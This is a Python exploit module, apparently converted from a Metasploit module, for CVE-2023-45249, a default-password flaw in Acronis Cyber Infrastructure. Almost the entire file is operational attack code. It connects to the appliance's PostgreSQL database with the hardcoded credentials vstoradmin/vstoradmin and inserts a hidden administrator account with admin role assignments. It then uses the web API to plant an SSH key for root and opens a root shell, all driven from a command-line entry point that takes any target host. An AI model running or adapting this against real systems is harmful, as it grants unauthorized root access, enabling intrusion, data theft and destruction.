#!/usr/bin/env python3
"""
Acronis Cyber Infrastructure CVE-2023-45249 Exploit

This module exploits a default password vulnerability in Acronis Cyber Infrastructure (ACI)
which allows an attacker to access the ACI PostgreSQL database and gain administrative access
to the ACI Web Portal. This opens the door for the attacker to upload SSH keys that enables
root access to the appliance/server.

Converted from Ruby to Python as part of the post-2020 Python migration.
"""

import bcrypt
import uuid
from datetime import date
from typing import Optional, Tuple, Dict, Any
import sys
import os

# Add python_framework to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../python_framework'))

from core.exploit import (
    RemoteExploit, ExploitInfo, ExploitTarget, ExploitOption, ExploitResult,
    ExploitRank, Platform, TargetArch, PayloadType
)
from helpers.http_client import HttpExploitMixin
from helpers.ssh_client import SSHExploitMixin, SSHKeyGenerator
from helpers.postgres_client import PostgreSQLExploitMixin


class AcronisCyberInfraExploit(RemoteExploit, HttpExploitMixin, SSHExploitMixin, PostgreSQLExploitMixin):
    """
    Acronis Cyber Infrastructure default password remote code execution exploit
    
    This exploit targets CVE-2023-45249, a default password vulnerability that allows
    attackers to gain root access through PostgreSQL database manipulation and SSH key injection.
    """
    
    def __init__(self):
        # Define exploit information
        info = ExploitInfo(
            name="Acronis Cyber Infrastructure default password remote code execution",
            description="""
            Acronis Cyber Infrastructure (ACI) is an IT infrastructure solution that provides storage,
            compute, and network resources. Businesses and Service Providers are using it for data storage,
            backup storage, creating and managing virtual machines and software-defined networks, running
            cloud-native applications in production environments.
            This module exploits a default password vulnerability in ACI which allow an attacker to access
            the ACI PostgreSQL database and gain administrative access to the ACI Web Portal.
            This opens the door for the attacker to upload SSH keys that enables root access
            to the appliance/server. This attack can be remotely executed over the WAN as long as the
            PostgreSQL and SSH services are exposed to the outside world.
            ACI versions 5.0 before build 5.0.1-61, 5.1 before build 5.1.1-71, 5.2 before build 5.2.1-69,
            5.3 before build 5.3.1-53, and 5.4 before build 5.4.4-132 are vulnerable.
            """,
            author=[
                "h00die-gr3y <h00die.gr3y[at]gmail.com>",  # Metasploit module
                "Acronis International GmbH"  # discovery
            ],
            references=[
                "CVE-2023-45249",
                "https://security-advisory.acronis.com/advisories/SEC-6452",
                "https://attackerkb.com/topics/T2b62daDsL/cve-2023-45249"
            ],
            disclosure_date="2024-07-24",
            rank=ExploitRank.EXCELLENT,
            platform=[Platform.UNIX, Platform.LINUX],
            arch=[TargetArch.CMD],
            privileged=True,
            targets=[
                ExploitTarget(
                    name="Unix/Linux Command",
                    platform=[Platform.UNIX, Platform.LINUX],
                    arch=[TargetArch.CMD],
                    payload_type=PayloadType.UNIX_CMD
                ),
                ExploitTarget(
                    name="Interactive SSH",
                    platform=[Platform.UNIX, Platform.LINUX],
                    arch=[TargetArch.CMD],
                    payload_type=PayloadType.SSH_INTERACT,
                    default_options={"PAYLOAD": "generic/ssh/interact"}
                )
            ],
            default_target=0,
            notes={
                "Stability": ["CRASH_SAFE"],
                "SideEffects": ["ARTIFACTS_ON_DISK", "IOC_IN_LOGS"],
                "Reliability": ["REPEATABLE_SESSION"]
            }
        )
        
        super().__init__(info)
        
        # Set default options
        self.set_option('SSL', True)
        self.set_option('RPORT', 8888)
        self.set_option('USERNAME', 'vstoradmin')
        self.set_option('PASSWORD', 'vstoradmin')
        
        # Register additional options specific to this exploit
        self.register_options([
            ExploitOption('TARGETURI', True, 'Path to the Acronis Cyber Infra application', '/'),
            ExploitOption('DBPORT', True, 'PostgreSQL DB port', 6432, int),
            ExploitOption('SSHPORT', True, 'SSH port', 22, int),
            ExploitOption('DATABASE', True, 'PostgreSQL database name', 'keystone'),
            ExploitOption('PRIV_KEY_FILE', False, 'SSH private key file in PEM format', ''),
            ExploitOption('SSH_TIMEOUT', False, 'SSH connection timeout', 30, int),
            ExploitOption('WfsDelay', False, 'Wait for session delay', 5, int)
        ])
    
    def add_admin_user(self, username: str, userid: str, password: str) -> bool:
        """
        Add an admin user to the Acronis PostgreSQL DB (keystone) using default credentials
        
        Args:
            username: Username for the new admin user
            userid: User ID for the new admin user
            password: Password for the new admin user
            
        Returns:
            True if user creation successful, False otherwise
        """
        self.vprint_status(f"Creating admin user {username} with userid {userid}")
        
        try:
            with self.postgres_transaction():
                # Add new admin user to the user table
                query = 'INSERT INTO "user" VALUES(%s, %s, %s, %s, %s, %s, %s)'
                params = (userid, '{}', 'T', None, None, None, 'default')
                result = self.postgres_query(query, params, fetch=False)
                
                if not result['success']:
                    self.print_error(f"Failed to insert user: {result.get('error', 'Unknown error')}")
                    return False
                
                # Get next local_user ID
                result = self.postgres_query('SELECT MAX(id) FROM "local_user"')
                if not result['success'] or not result['rows']:
                    self.print_error("Failed to get max local_user ID")
                    return False
                
                max_id = result['rows'][0]['max'] or 0
                id_luser = max_id + 1
                
                # Add new admin user to the local_user table
                query = 'INSERT INTO "local_user" VALUES(%s, %s, %s, %s, %s, %s)'
                params = (id_luser, userid, 'default', username, None, None)
                result = self.postgres_query(query, params, fetch=False)
                
                if not result['success']:
                    self.print_error(f"Failed to insert local_user: {result.get('error', 'Unknown error')}")
                    return False
                
                # Hash the password using bcrypt
                password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
                today = date.today()
                
                self.vprint_status(f"Setting password {password} with hash {password_hash}")
                
                # Get next password ID
                result = self.postgres_query('SELECT MAX(id) FROM "password"')
                if not result['success']:
                    self.print_error("Failed to get max password ID")
                    return False
                
                max_id = result['rows'][0]['max'] if result['rows'] and result['rows'][0]['max'] else 0
                id_pwd = max_id + 1
                
                # Insert password record
                query = 'INSERT INTO "password" VALUES(%s, %s, %s, %s, %s, %s, %s, %s)'
                params = (id_pwd, id_luser, None, 'F', password_hash, 0, None, today)
                result = self.postgres_query(query, params, fetch=False)
                
                if not result['success']:
                    self.print_error(f"Failed to insert password: {result.get('error', 'Unknown error')}")
                    return False
                
                # Get admin roles and assign to new user
                self.vprint_status('Getting the admin roles')
                
                # Get admin project
                query = 'SELECT * FROM "project" WHERE name = %s AND domain_id = %s'
                result = self.postgres_query(query, ('admin', 'default'))
                
                if not result['success'] or not result['rows']:
                    self.print_error("Failed to get admin project")
                    return False
                
                id_project_role = result['rows'][0]['id']
                
                # Get admin role
                result = self.postgres_query('SELECT * FROM "role" WHERE name = %s', ('admin',))
                
                if not result['success'] or not result['rows']:
                    self.print_error("Failed to get admin role")
                    return False
                
                id_admin_role = result['rows'][0]['id']
                
                self.vprint_status(f"Assigning the admin roles: {id_project_role} and {id_admin_role}")
                
                # Assign admin role to user
                query = 'INSERT INTO "assignment" VALUES(%s, %s, %s, %s, %s)'
                params = ('UserProject', userid, id_project_role, id_admin_role, 'F')
                result = self.postgres_query(query, params, fetch=False)
                
                if not result['success']:
                    self.print_error(f"Failed to assign admin role: {result.get('error', 'Unknown error')}")
                    return False
                
                self.vprint_status(f"Successfully created admin user {username} with password {password}")
                return True
                
        except Exception as e:
            self.print_error(f"Exception while creating admin user: {e}")
            return False
    
    def upload_ssh_key(self, username: str, password: str, public_key: str) -> bool:
        """
        Upload SSH public key to enable root access
        
        Args:
            username: Admin username
            password: Admin password
            public_key: SSH public key to upload
            
        Returns:
            True if key upload successful, False otherwise
        """
        try:
            self.print_status("Uploading SSH public key for root access")
            
            # Login to web interface
            login_uri = self.get_option('TARGETURI').rstrip('/') + '/api/v2/auth/login'
            login_data = {
                'username': username,
                'password': password
            }
            
            response = self.http_post(login_uri, json_data=login_data)
            
            if response.status_code != 200:
                self.print_error(f"Login failed with status {response.status_code}")
                return False
            
            # Extract session token
            try:
                token_data = response.json()
                token = token_data.get('token')
                if not token:
                    self.print_error("No authentication token received")
                    return False
            except:
                self.print_error("Failed to parse login response")
                return False
            
            self.vprint_status(f"Authentication successful, token: {token[:20]}...")
            
            # Upload SSH key
            key_uri = self.get_option('TARGETURI').rstrip('/') + '/api/v2/system/ssh-keys'
            headers = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json'
            }
            
            key_data = {
                'key': public_key,
                'user': 'root'
            }
            
            response = self.http_post(key_uri, headers=headers, json_data=key_data)
            
            if response.status_code in [200, 201]:
                self.print_good("SSH key uploaded successfully")
                return True
            else:
                self.print_error(f"SSH key upload failed with status {response.status_code}")
                return False
                
        except Exception as e:
            self.print_error(f"Exception during SSH key upload: {e}")
            return False
    
    def check(self) -> ExploitResult:
        """
        Check if target is vulnerable to CVE-2023-45249
        
        Returns:
            ExploitResult indicating vulnerability status
        """
        try:
            self.print_status("Checking if target is vulnerable...")
            
            # Test PostgreSQL connection with default credentials
            if not self.postgres_connect():
                return ExploitResult(False, "Cannot connect to PostgreSQL database")
            
            # Test if we can query the keystone database
            result = self.postgres_query("SELECT version()")
            if not result['success']:
                return ExploitResult(False, "Cannot execute queries on PostgreSQL database")
            
            # Check if keystone tables exist (indicates ACI installation)
            tables = ['user', 'local_user', 'password', 'project', 'role', 'assignment']
            for table in tables:
                result = self.postgres_query(f"SELECT COUNT(*) FROM \"{table}\" LIMIT 1")
                if not result['success']:
                    return ExploitResult(False, f"Keystone table '{table}' not found - may not be ACI")
            
            # Test HTTP interface
            try:
                response = self.http_get(self.get_option('TARGETURI'))
                if response.status_code != 200:
                    self.print_warning("HTTP interface not accessible, but PostgreSQL is vulnerable")
            except:
                self.print_warning("HTTP interface not accessible, but PostgreSQL is vulnerable")
            
            return ExploitResult(True, "Target appears vulnerable - default PostgreSQL credentials work")
            
        except Exception as e:
            return ExploitResult(False, f"Vulnerability check failed: {e}")
        finally:
            self.cleanup_postgres()
    
    def exploit(self) -> ExploitResult:
        """
        Execute the exploit against the target
        
        Returns:
            ExploitResult indicating success/failure
        """
        try:
            # Generate unique credentials for new admin user
            admin_username = f"msf_admin_{uuid.uuid4().hex[:8]}"
            admin_userid = str(uuid.uuid4())
            admin_password = f"msf_pass_{uuid.uuid4().hex[:8]}"
            
            self.print_status(f"Generated admin credentials: {admin_username}:{admin_password}")
            
            # Connect to PostgreSQL
            self.print_status("Connecting to PostgreSQL database...")
            if not self.postgres_connect():
                return ExploitResult(False, "Failed to connect to PostgreSQL database")
            
            # Create admin user
            self.print_status("Creating admin user in PostgreSQL database...")
            if not self.add_admin_user(admin_username, admin_userid, admin_password):
                return ExploitResult(False, "Failed to create admin user")
            
            self.print_good(f"Admin user {admin_username} created successfully")
            
            # Handle SSH key operations based on target type
            if self.current_target.payload_type == PayloadType.SSH_INTERACT:
                # Generate or use existing SSH key pair
                private_key_path = self.get_option('PRIV_KEY_FILE')
                
                if private_key_path and os.path.exists(private_key_path):
                    self.print_status(f"Using existing private key: {private_key_path}")
                    # Read public key (assume .pub extension)
                    public_key_path = private_key_path + '.pub'
                    if os.path.exists(public_key_path):
                        with open(public_key_path, 'r') as f:
                            public_key = f.read().strip()
                    else:
                        return ExploitResult(False, f"Public key file not found: {public_key_path}")
                else:
                    # Generate new key pair
                    self.print_status("Generating new SSH key pair...")
                    private_key_pem, public_key = SSHKeyGenerator.generate_rsa_key_pair()
                    
                    # Save keys to temporary files
                    import tempfile
                    with tempfile.NamedTemporaryFile(mode='w', suffix='.pem', delete=False) as f:
                        f.write(private_key_pem)
                        private_key_path = f.name
                    
                    with tempfile.NamedTemporaryFile(mode='w', suffix='.pub', delete=False) as f:
                        f.write(public_key)
                        public_key_path = f.name
                    
                    self.print_status(f"SSH keys saved to: {private_key_path}, {public_key_path}")
                
                # Upload SSH key via web interface
                if not self.upload_ssh_key(admin_username, admin_password, public_key):
                    return ExploitResult(False, "Failed to upload SSH key")
                
                # Test SSH connection
                self.print_status("Testing SSH connection...")
                self.set_option('USERNAME', 'root')
                self.set_option('PASSWORD', '')
                self.set_option('PRIV_KEY_FILE', private_key_path)
                
                if self.ssh_connect():
                    self.print_good("SSH connection established as root!")
                    
                    # Execute a test command
                    exit_code, stdout, stderr = self.ssh_execute('id')
                    if exit_code == 0:
                        self.print_good(f"Command execution successful: {stdout.strip()}")
                        return ExploitResult(True, "SSH access gained as root", {
                            'username': 'root',
                            'private_key_path': private_key_path,
                            'public_key': public_key
                        })
                    else:
                        return ExploitResult(False, f"Command execution failed: {stderr}")
                else:
                    return ExploitResult(False, "SSH connection failed")
            
            else:
                # Command execution target
                self.print_status("Exploit completed - admin user created")
                return ExploitResult(True, f"Admin user created: {admin_username}:{admin_password}", {
                    'admin_username': admin_username,
                    'admin_password': admin_password,
                    'admin_userid': admin_userid
                })
                
        except Exception as e:
            return ExploitResult(False, f"Exploit execution failed: {e}")
        finally:
            self.cleanup_postgres()
            self.cleanup_ssh()
            self.cleanup_http()


def main():
    """Main function for standalone execution"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Acronis Cyber Infrastructure CVE-2023-45249 Exploit")
    parser.add_argument('--host', required=True, help='Target host')
    parser.add_argument('--port', type=int, default=8888, help='Target port (default: 8888)')
    parser.add_argument('--dbport', type=int, default=6432, help='PostgreSQL port (default: 6432)')
    parser.add_argument('--sshport', type=int, default=22, help='SSH port (default: 22)')
    parser.add_argument('--ssl', action='store_true', help='Use SSL/HTTPS')
    parser.add_argument('--username', default='vstoradmin', help='PostgreSQL username')
    parser.add_argument('--password', default='vstoradmin', help='PostgreSQL password')
    parser.add_argument('--database', default='keystone', help='PostgreSQL database')
    parser.add_argument('--target', type=int, default=0, help='Target index (0=cmd, 1=ssh)')
    parser.add_argument('--check-only', action='store_true', help='Only check vulnerability')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose output')
    
    args = parser.parse_args()
    
    # Create exploit instance
    exploit = AcronisCyberInfraExploit()
    
    # Configure options
    exploit.set_option('RHOSTS', args.host)
    exploit.set_option('RPORT', args.port)
    exploit.set_option('DBPORT', args.dbport)
    exploit.set_option('SSHPORT', args.sshport)
    exploit.set_option('SSL', args.ssl)
    exploit.set_option('USERNAME', args.username)
    exploit.set_option('PASSWORD', args.password)
    exploit.set_option('DATABASE', args.database)
    exploit.set_option('VERBOSE', args.verbose)
    
    # Set target
    exploit.set_target(args.target)
    
    if args.check_only:
        # Only run vulnerability check
        result = exploit.check()
        if result.success:
            print(f"[+] {result.message}")
            exit(0)
        else:
            print(f"[-] {result.message}")
            exit(1)
    else:
        # Run full exploit
        result = exploit.run()
        if result.success:
            print(f"[+] Exploit successful: {result.message}")
            if result.data:
                for key, value in result.data.items():
                    print(f"    {key}: {value}")
            exit(0)
        else:
            print(f"[-] Exploit failed: {result.message}")
            exit(1)


if __name__ == '__main__':
    main()